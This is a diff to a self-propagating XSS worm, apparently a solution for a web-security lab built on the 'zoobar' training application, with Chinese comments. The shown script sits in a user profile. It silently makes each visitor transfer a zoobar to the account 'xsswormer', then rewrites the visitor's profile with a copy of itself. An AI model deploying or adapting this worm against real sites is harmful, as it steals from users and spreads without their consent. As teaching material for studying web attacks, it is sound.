@@ -1,5 +1,4 @@
 <!--xss 蠕虫，将其存入user profile中生效-->
-
 <span id="xssworm-span">
     <script>
         xmlhttp=new XMLHttpRequest();
@@ -7,8 +6,9 @@
         xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
         // 提交请求，为 xsswormer 转一个zoobar
         xmlhttp.send("zoobars=1&recipient=xsswormer&submission=Send");
-        xmlhttp=new XMLHttpRequest();
 
+        // 提交profile更新请求
+        xmlhttp=new XMLHttpRequest();
         xmlhttp.open("POST","https://niss.com/index.php",true);
         xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
         // 读取本文件 ==> str
